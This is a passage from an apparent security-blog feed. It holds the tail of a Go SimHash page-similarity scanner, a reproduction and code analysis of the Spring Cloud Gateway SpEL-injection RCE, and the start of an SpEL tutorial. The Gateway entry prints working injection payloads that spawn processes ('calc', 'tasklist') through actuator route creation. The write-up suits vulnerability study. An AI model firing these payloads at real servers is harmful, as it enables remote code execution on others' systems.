class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  相似度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SimHash)</span></span> Similarity(hash, other *big.Int) <span class="type">float64</span> &#123;</span><br><span class="line">a := <span class="built_in">new</span>(big.Rat)</span><br><span class="line">a.SetInt(hash)</span><br><span class="line">b := <span class="built_in">new</span>(big.Rat)</span><br><span class="line">b.SetInt(other)</span><br><span class="line">val := <span class="built_in">new</span>(big.Rat)</span><br><span class="line"><span class="keyword">if</span> a.Cmp(b) &gt; <span class="number">0</span> &#123;</span><br><span class="line">val.Quo(b, a)</span><br><span class="line">f, _ := val.Float64()</span><br><span class="line"><span class="keyword">return</span> f</span><br><span class="line">&#125;</span><br><span class="line">val.Quo(a, b)</span><br><span class="line">f, _ := val.Float64()</span><br><span class="line"><span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  海明距离hash</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SimHash)</span></span> Simhash(str <span class="type">string</span>) *big.Int &#123;</span><br><span class="line">m := strings.Split(str, <span class="string">&quot;，&quot;</span>)</span><br><span class="line"></span><br><span class="line">token_int := <span class="built_in">make</span>([]<span class="type">int</span>, s.HashBits)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(m); i++ &#123;</span><br><span class="line">temp := m[i]</span><br><span class="line">t := s.Hash(temp)</span><br><span class="line"><span class="comment">//fmt.Println(t)</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; s.HashBits; j++ &#123;</span><br><span class="line">fbIng := big.NewInt(<span class="number">1</span>)</span><br><span class="line">bitMask := fbIng.Lsh(fbIng, <span class="type">uint</span>(j))</span><br><span class="line">statusBig := <span class="built_in">new</span>(big.Int)</span><br><span class="line">statusBig.And(t, bitMask)</span><br><span class="line"><span class="keyword">if</span> statusBig.Cmp(big.NewInt(<span class="number">0</span>)) != <span class="number">0</span> &#123;</span><br><span class="line">token_int[j] += <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">token_int[j] -= <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fingerprint := big.NewInt(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; s.HashBits; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> token_int[i] &gt;= <span class="number">0</span> &#123;</span><br><span class="line">oneBig := big.NewInt(<span class="number">1</span>)</span><br><span class="line">tbig := big.NewInt(<span class="number">0</span>)</span><br><span class="line">fingerprint.Add(fingerprint, tbig.Lsh(oneBig, <span class="type">uint</span>(i)))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fingerprint</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  初始化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">params</span><span class="params">()</span></span> (s *SimHash) &#123;</span><br><span class="line">s = &amp;SimHash&#123;&#125;</span><br><span class="line">s.HashBits = <span class="number">128</span></span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">hash 值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SimHash)</span></span> Hash(token <span class="type">string</span>) *big.Int &#123;</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> big.NewInt(<span class="number">0</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(token)</span></span><br><span class="line">bigIntToken := big.NewInt(<span class="type">int64</span>(token[<span class="number">0</span>]))</span><br><span class="line">funit := <span class="built_in">new</span>(big.Int)</span><br><span class="line">x := funit.Lsh(bigIntToken, <span class="number">7</span>)</span><br><span class="line">m := big.NewInt(<span class="number">1000003</span>)</span><br><span class="line">mslB := big.NewInt(<span class="number">1</span>)</span><br><span class="line">mask := mslB.Lsh(mslB, <span class="type">uint</span>(s.HashBits))</span><br><span class="line">tsk_b := mask.Sub(mask, big.NewInt(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(token); i++ &#123;</span><br><span class="line">tokens := big.NewInt(<span class="type">int64</span>(token[i]))</span><br><span class="line">x.Mul(x, m)</span><br><span class="line">x.Xor(x, tokens)</span><br><span class="line">x.And(x, tsk_b)</span><br><span class="line">&#125;</span><br><span class="line">x = x.Xor(x, big.NewInt(<span class="type">int64</span>(<span class="built_in">len</span>(token))))</span><br><span class="line"><span class="keyword">if</span> x == big.NewInt(<span class="number">-1</span>) &#123;</span><br><span class="line">x = big.NewInt(<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crawl</span><span class="params">(url <span class="type">string</span>)</span></span>(<span class="type">string</span>) &#123;</span><br><span class="line">resp,err := http.Get(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body,err := ioutil.ReadAll(resp.Body)</span><br><span class="line"> response := <span class="type">string</span>(body)</span><br><span class="line"> fmt.Println(response)</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> str := crawl(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line"> str2 := crawl(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">s := params()</span><br><span class="line"><span class="comment">//str hash 值</span></span><br><span class="line">hash := s.Simhash(str)</span><br><span class="line"><span class="comment">//fmt.Println(hash)</span></span><br><span class="line"><span class="comment">////str2 距离</span></span><br><span class="line">hash2 := s.Simhash(str2)</span><br><span class="line">sm := s.Similarity(hash, hash2)</span><br><span class="line">fmt.Println(sm)</span><br><span class="line"><span class="keyword">if</span> sm &gt; <span class="number">0.85</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;此页面相似&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;此页面不相似&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/shaosks/p/9121774.html">https://www.cnblogs.com/shaosks/p/9121774.html</a></p>]]></content>
    
    
    <summary type="html">当遇到自定义错误页面或者其他的时候，遇到泛解析的情况，应该以什么方式进行处理</summary>
    
    
    
    <category term="扫描器" scheme="https://h0ld1rs.github.io/categories/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
    
    <category term="扫描器" scheme="https://h0ld1rs.github.io/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>spring-gateaway分析</title>
    <link href="https://h0ld1rs.github.io/posts/32500.html"/>
    <id>https://h0ld1rs.github.io/posts/32500.html</id>
    <published>2022-03-20T15:33:32.000Z</published>
    <updated>2022-03-21T15:36:09.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="spring-gateaway分析"><a href="#spring-gateaway分析" class="headerlink" title="spring-gateaway分析"></a>spring-gateaway分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>3.1.0</li><li>&lt; &#x3D; 3.0.0 - 3.0.6</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先导入依赖包:<code>pom.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Springboot-Gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2020.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改配置文件<code>application.yml</code>，(这个写一个springboot常见的配置文件吧，直接，先鸽着)</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">baidu</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">&#x27;https://www.baidu.com/&#x27;</span> <span class="comment"># 访问/skip/baidu 时路由到百度首页</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">8000</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/skip/baidu</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">StripPrefix=2</span></span><br></pre></td></tr></table></figure><p>然后创建启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后启动服务，如果访问<code>http://localhost:8080/skip/baidu</code>,如果能跳转到百度首页，证明搭建无误。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里，使用<code>postman</code>进行演示。</p><ul><li><p>查看当前路由</p><p><strong>GET</strong> <a href="http://localhost:8080/actuator/gateway/routes">http://localhost:8080/actuator/gateway/routes</a></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321121108.png"></p></li><li><p>添加包含恶意代码注入的路由</p><p><strong>POST</strong> <a href="http://localhost:8080/actuator/gateway/routes/test">http://localhost:8080/actuator/gateway/routes/test</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Result&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.ProcessBuilder(\&quot;calc\&quot;).start()&#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.baidu.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>刷新网关路由</p><p><strong>POST</strong> <a href="http://localhost:8080/actuator/gateway/refresh">http://localhost:8080/actuator/gateway/refresh</a></p><p>就可以弹出计算器了</p></li></ul><p>还有其他攻击方式，可以结合<code>https://h0ld1rs.github.io/posts/15596.html</code>中提到的方式，进行命令回显</p><p>将恶意类的注入换成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="keyword">new</span> <span class="title class_">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;\<span class="string">&quot;tasklist\&quot;&#125;).getInputStream()))&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>然后使用<code>GET</code>方法去访问添加的恶意路由：</p><p><strong>GET</strong> <a href="http://localhost:8080/actuator/gateway/routes/test">http://localhost:8080/actuator/gateway/routes/test</a></p><p>就可以得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321123527.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>看木头师傅的文章，可以定位到修复的<code>commit</code>记录，</p><p><a href="https://github.com/spring-cloud/spring-cloud-gateway/commit/818fdb653e41cc582e662e085486311b46aa779b">https://github.com/spring-cloud/spring-cloud-gateway/commit/818fdb653e41cc582e662e085486311b46aa779b</a></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321224902.png"></p><p>使用maven下载好以后，可以定位到代码处</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321225003.png"></p><p>可以看到如果 rawValue 如果是 #{ 开头同时 } 结尾，就会进入到 SPEL 解析的部分。然后开始找向上利用的部分，发现在当前文件的 ShortcutType 中调用了 getValue 获取值，</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321225530.png"></p><p>然后，向上查询，找一找哪里调用了<code>normalize</code>的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321231028.png"></p><p>定位到 ConfigurationService$ConfigurableBuilder#normalizeProperties 函数，根据前面的代码分析可得我们这里如果 this.properties 可控那么就可以最终控制 rawValue 从而控制 SPEL 表达式中的内容</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321231507.png"></p><p>然后发现在当前文件中的 bind 调用触发，但是可以看到在 bind函数 中并没有对 properties 进行赋值的操作，说明 properties 是在 bind 之前进行设置的</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321231824.png"></p><p>然后，全局搜索 bind() 在查看 bind 的时候需要留意有对 properties 赋值的地方</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321232646.png"></p><p>这里找了 RouteDefinitionRouteLocator#lookup 在函数中可以看到在 bind 前面对 properties 进行了设置，而 properties 是从 predicate 中进行获取的</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321232838.png"></p><p>向上查找找到 combinePredicates</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321233057.png"></p><p>再向上看可以发现 predicate 与 routeDefinition 有关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> org.springframework.cloud.gateway.route.Route <span class="title function_">convertToRoute</span><span class="params">(org.springframework.cloud.gateway.route.RouteDefinition routeDefinition)</span> &#123;</span><br><span class="line">AsyncPredicate&lt;ServerWebExchange&gt; predicate = combinePredicates(routeDefinition);</span><br><span class="line">List&lt;GatewayFilter&gt; gatewayFilters = getFilters(routeDefinition);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Route.async(routeDefinition).asyncPredicate(predicate).replaceFilters(gatewayFilters).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321233335.png"></p><p>到这里，知道了大概是路由中 与 predicate造成的入口RCE</p><p>集合官方文档</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220321233447.png"></p><p>就可以产生这次的<code>payload</code>了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/liu940204/article/details/123416963">https://blog.csdn.net/liu940204/article/details/123416963</a></p><p><a href="http://wjlshare.com/archives/1748">http://wjlshare.com/archives/1748</a></p>]]></content>
    
    
    <summary type="html">对Springboot中进行复现分析</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SPEL学习</title>
    <link href="https://h0ld1rs.github.io/posts/15596.html"/>
    <id>https://h0ld1rs.github.io/posts/15596.html</id>
    <published>2022-03-19T03:10:48.000Z</published>
    <updated>2022-03-20T15:32:05.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SPEL表达式的学习"><a href="#SPEL表达式的学习" class="headerlink" title="SPEL表达式的学习"></a>SPEL表达式的学习</h1><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><h3 id="1-不注册新变量的用法"><a href="#1-不注册新变量的用法" class="headerlink" title="1. 不注册新变量的用法"></a>1. 不注册新变量的用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line"><span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="comment">//解析表达式</span></span><br><span class="line">System.out.println( exp.getValue() );<span class="comment">//取值，Hello World！</span></span><br></pre></td></tr></table></figure><h3 id="2-自定义注册变量的用法"><a href="#2-自定义注册变量的用法" class="headerlink" title="2. 自定义注册变量的用法"></a>2. 自定义注册变量的用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Spel</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Spel</span>();</span><br><span class="line">StandardEvaluationContext context=<span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">context.setVariable(<span class="string">&quot;user&quot;</span>,user);<span class="comment">//通过StandardEvaluationContext注册自定义变量</span></span><br><span class="line"><span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#user.name&quot;</span>);<span class="comment">//解析表达式</span></span><br><span class="line">System.out.println(expression.getValue(context).toString() );<span class="comment">//取值,输出何止</span></span><br></pre></td></tr></table></figure><h2 id="实战用法"><a href="#实战用法" class="headerlink" title="实战用法"></a>实战用法</h2><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>1.1.0-1.1.12</li><li>1.2.0-1.2.7</li><li>1.3.0</li></ul><h4 id="我的pom-xml"><a href="#我的pom-xml" class="headerlink" title="我的pom.xml"></a>我的pom.xml</h4><p>这是 1.3.0 版本的 Springboot，可以复现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span 